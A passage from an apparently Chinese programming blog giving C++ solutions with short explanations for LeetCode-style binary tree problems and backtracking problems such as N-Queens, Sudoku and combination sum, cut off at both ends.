queue1.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">auto</span> node2 = queue2.<span class="hljs-built_in">front</span>();<br>            queue2.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (node1-&gt;val != node2-&gt;val) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">auto</span> left1 = node1-&gt;left, right1 = node1-&gt;right,<br>                 left2 = node2-&gt;left, right2 = node2-&gt;right;<br>            <span class="hljs-keyword">if</span> ((left1 == <span class="hljs-literal">nullptr</span>) ^ (left2 == <span class="hljs-literal">nullptr</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((right1 == <span class="hljs-literal">nullptr</span>) ^ (right2 == <span class="hljs-literal">nullptr</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (left1 != <span class="hljs-literal">nullptr</span>) &#123;<br>                queue1.<span class="hljs-built_in">push</span>(left1);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (left2 != <span class="hljs-literal">nullptr</span>) &#123;<br>                queue2.<span class="hljs-built_in">push</span>(left2);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (right1 != <span class="hljs-literal">nullptr</span>) &#123;<br>                queue1.<span class="hljs-built_in">push</span>(right1);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (right2 != <span class="hljs-literal">nullptr</span>) &#123;<br>                queue2.<span class="hljs-built_in">push</span>(right2);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="翻转二叉树">翻转二叉树</h2><blockquote><p>从根节点开始，递归地对树进行遍历，并从叶子节点先开始翻转。如果当前遍历到的节点root的左右两棵子树都已经翻转，那么我们只需要交换两棵子树的位置，即可完成以root 为根节点的整棵子树的翻转。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br><br>        TreeNode* left = <span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        TreeNode* right = <span class="hljs-built_in">invertTree</span>(root-&gt;right);<br>        root-&gt;left = right;<br>        root-&gt;right = left;<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二叉树的最大深度">二叉树的最大深度</h2><blockquote><p>法一：深度优先搜索。如果我们知道了左子树和右子树的最大深度 l 和r，那么该二叉树的最大深度即为<span class="math display">\[\max(l,r) +1\]</span>，而左子树和右子树的最大深度又可以以同样的方式进行计算。因此我们可以用「深度优先搜索」的方法来计算二叉树的最大深度。具体而言，在计算当前二叉树的最大深度时，可以先递归计算出其左子树和右子树的最大深度，然后在O(1) 时间内计算出当前二叉树的最大深度。递归在访问到空节点时退出。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">maxDepth</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">maxDepth</span>(root-&gt;right);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(left, right) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>法二：广度优先搜索。广度优先搜索的队列里存放的是「当前层的所有节点」。每次拓展下一层的时候，不同于广度优先搜索的每次只从队列里拿出一个节点，我们需要将队列里的所有节点都拿出来进行拓展，这样能保证每次拓展完的时候队列里存放的是当前层的所有节点，即我们是一层一层地进行拓展，最后我们用一个变量ans 来维护拓展的次数，该二叉树的最大深度即为 ans。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        queue&lt;TreeNode*&gt; q;<br>        q.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> sz = q.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">while</span> (sz &gt; <span class="hljs-number">0</span>) &#123;<br>                TreeNode* node = q.<span class="hljs-built_in">front</span>();<br>                q.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (node-&gt;left) &#123;<br>                    q.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                &#125;<br>                <span class="hljs-keyword">if</span> (node-&gt;right) &#123;<br>                    q.<span class="hljs-built_in">push</span>(node-&gt;right);<br>                &#125;<br>                sz--;<br>            &#125;<br>            ans++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二叉树的直径">二叉树的直径</h2><blockquote><p>深度优先搜索。一条路径的长度为该路径经过的节点数减一，所以求直径（即求路径长度的最大值）等效于求路径经过节点数的最大值减一。而任意一条路径均可以被看作由某个节点为起点，从其左儿子和右儿子向下遍历的路径拼接得到。假设我们知道对于该节点的左儿子向下遍历经过最多的节点数L （即以左儿子为根的子树的深度） 和其右儿子向下遍历经过最多的节点数 R（即以右儿子为根的子树的深度），那么以该节点为起点的路径经过节点数的最大值即为L+R+1 。我们记节点 node 为起点的路径经过节点数的最大值为 <spanclass="math display">\[d_{\textit{node}}\]</span>，那么二叉树的直径就是所有节点 <spanclass="math display">\[d_{\textit{node}}\]</span>的最大值减一。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">diameterOfBinaryTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">depth</span>(root);<br>        <span class="hljs-keyword">return</span> ans - <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">depth</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">depth</span>(root-&gt;right);<br>        ans = <span class="hljs-built_in">max</span>(ans, left + right + <span class="hljs-number">1</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(left, right) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="合并二叉树">合并二叉树</h2><blockquote><ul><li>如果两个二叉树的对应节点都为空，则合并后的二叉树的对应节点也为空；</li><li>如果两个二叉树的对应节点只有一个为空，则合并后的二叉树的对应节点为其中的非空节点；</li><li>如果两个二叉树的对应节点都不为空，则合并后的二叉树的对应节点的值为两个二叉树的对应节点的值之和，此时需要显性合并两个节点。</li></ul><p>对一个节点进行合并之后，还要对该节点的左右子树分别进行合并。这是一个递归的过程。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">mergeTrees</span><span class="hljs-params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (t1 == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> t2;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (t2 == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> t1;<br>        &#125;<br><br>        <span class="hljs-keyword">auto</span> merged = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(t1-&gt;val + t2-&gt;val);<br>        merged-&gt;left = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;left, t2-&gt;left);<br>        merged-&gt;right = <span class="hljs-built_in">mergeTrees</span>(t1-&gt;right, t2-&gt;right);<br><br>        <span class="hljs-keyword">return</span> merged;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="另一个树的子树">另一个树的子树</h2><blockquote><p>深度优先搜索枚举 s 中的每一个节点，判断这个点的子树是否和 t相等。如何判断一个节点的子树是否和 t相等呢，我们又需要做一次深度优先搜索来检查，即让两个指针一开始先指向该节点和t的根，然后「同步移动」两个指针来「同步遍历」这两棵树，判断对应位置是否相等。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cheak</span><span class="hljs-params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!root &amp;&amp; !subRoot) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((root &amp;&amp; !subRoot) || (!root &amp;&amp; subRoot) ||<br>            (root-&gt;val != subRoot-&gt;val)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">cheak</span>(root-&gt;left, subRoot-&gt;left) &amp;&amp;<br>               <span class="hljs-built_in">cheak</span>(root-&gt;right, subRoot-&gt;right);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!root) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">cheak</span>(root, subRoot) || <span class="hljs-built_in">dfs</span>(root-&gt;left, subRoot) ||<br>               <span class="hljs-built_in">dfs</span>(root-&gt;right, subRoot);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSubtree</span><span class="hljs-params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">dfs</span>(root, subRoot);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="单值二叉树">单值二叉树</h2><blockquote><p>利用递归遍历二叉树的每个节点，并在递归过程中检查节点的值是否与根节点的值相等，以确定整个树是否是单值的。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">-1</span>;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isUnivalTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!root) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (res == <span class="hljs-number">-1</span>) &#123;<br>            res = root-&gt;val;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res != root-&gt;val) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">isUnivalTree</span>(root-&gt;left) &amp;&amp; <span class="hljs-built_in">isUnivalTree</span>(root-&gt;right);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="对称二叉树">对称二叉树</h2><blockquote><p>如果同时满足下面的条件，两个树互为镜像：</p><ul><li>它们的两个根结点具有相同的值</li><li>每个树的右子树都与另一个树的左子树镜像对称</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">cheak</span><span class="hljs-params">(TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!p &amp;&amp; !q) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!p || !q) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> p-&gt;val == q-&gt;val &amp;&amp; <span class="hljs-built_in">cheak</span>(p-&gt;left, q-&gt;right) &amp;&amp;<br>               <span class="hljs-built_in">cheak</span>(p-&gt;right, q-&gt;left);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">cheak</span>(root, root); &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="回溯相关问题">2. 回溯相关问题</h1><h2 id="n皇后">N皇后</h2><blockquote><p><code>solveNQueens</code> 函数负责创建一个初始棋盘并调用辅助函数<code>solveNQueensHelper</code>进行递归搜索。<code>solveNQueensHelper</code>函数则是核心的回溯算法实现，它尝试在当前行的每一个位置放置皇后，并递归调用自身，直到找到所有合法解为止。<code>isValid</code>函数用于检查当前位置是否可以放置皇后，通过检查列、左上方对角线和右上方对角线是否存在其他皇后来判断。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">solveNQueens</span>(<span class="hljs-type">int</span> n) &#123;<br>        vector&lt;vector&lt;string&gt;&gt; result;<br>        <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">board</span><span class="hljs-params">(n, string(n, <span class="hljs-string">&#x27;.&#x27;</span>))</span></span>;<br><br>        <span class="hljs-built_in">solveNQueensHelper</span>(board, <span class="hljs-number">0</span>, result);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solveNQueensHelper</span><span class="hljs-params">(vector&lt;string&gt;&amp; board, <span class="hljs-type">int</span> row,</span></span><br><span class="hljs-params"><span class="hljs-function">                            vector&lt;vector&lt;string&gt;&gt;&amp; result)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = board.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (row == n) &#123;<br>            result.<span class="hljs-built_in">push_back</span>(board);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> col = <span class="hljs-number">0</span>; col &lt; n; col++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isValid</span>(board, row, col)) &#123;<br>                board[row][col] = <span class="hljs-string">&#x27;Q&#x27;</span>;<br>                <span class="hljs-built_in">solveNQueensHelper</span>(board, row + <span class="hljs-number">1</span>, result);<br>                board[row][col] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;string&gt;&amp; board, <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = board.<span class="hljs-built_in">size</span>();<br><br>        <span class="hljs-comment">// 检查同一列是否有皇后</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; row; i++) &#123;<br>            <span class="hljs-keyword">if</span> (board[i][col] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 检查左上方对角线是否有皇后</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = row - <span class="hljs-number">1</span>, j = col - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &gt;= <span class="hljs-number">0</span>; i--, j--) &#123;<br>            <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 检查右上方对角线是否有皇后</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = row - <span class="hljs-number">1</span>, j = col + <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n; i--, j++) &#123;<br>            <span class="hljs-keyword">if</span> (board[i][j] == <span class="hljs-string">&#x27;Q&#x27;</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="解数独">解数独</h2><blockquote><p>使用递归和回溯算法。在每一个空位置尝试填入数字，然后递归地继续尝试填下一个位置。如果某个位置无法填入任何合法数字，则回溯到上一个位置，尝试其他可能性。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solveSudoku</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board)</span> </span>&#123; <span class="hljs-built_in">solve</span>(board); &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">solve</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> row = <span class="hljs-number">0</span>; row &lt; <span class="hljs-number">9</span>; row++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> col = <span class="hljs-number">0</span>; col &lt; <span class="hljs-number">9</span>; col++) &#123;<br>                <span class="hljs-keyword">if</span> (board[row][col] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> num = <span class="hljs-string">&#x27;1&#x27;</span>; num &lt;= <span class="hljs-string">&#x27;9&#x27;</span>; num++) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isValid</span>(board, row, col, num)) &#123;<br>                            board[row][col] = num;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">solve</span>(board)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                            &#125;<br>                            board[row][col] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//没有找到有效数字，触发回溯</span><br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board, <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">char</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;<br>            <span class="hljs-comment">// 检查行</span><br>            <span class="hljs-keyword">if</span> (board[row][i] == num) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 检查列</span><br>            <span class="hljs-keyword">if</span> (board[i][col] == num) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 检查 3x3 子格子</span><br>            <span class="hljs-keyword">if</span> (board[(row / <span class="hljs-number">3</span>) * <span class="hljs-number">3</span> + i / <span class="hljs-number">3</span>][(col / <span class="hljs-number">3</span>) * <span class="hljs-number">3</span> + i % <span class="hljs-number">3</span>] == num) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="组合总和">组合总和</h2><blockquote><p>对于这类寻找所有可行解的题，我们都可以尝试用「搜索回溯」的方法来解决。回到本题，我们定义递归函数dfs(target,combine,idx) 表示当前在 candidates 数组的第 idx 位，还剩target 要组合，已经组合的列表为 combine。递归的终止条件为 target≤0 或者candidates数组被全部用完。那么在当前的函数中，每次我们可以选择跳过不用第 idx个数，即执行 dfs(target,combine,idx+1)。也可以选择使用第 idx个数，即执行dfs(target−candidates[idx],combine,idx)，注意到每个数字可以被无限制重复选取，因此搜索的下标仍为idx。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 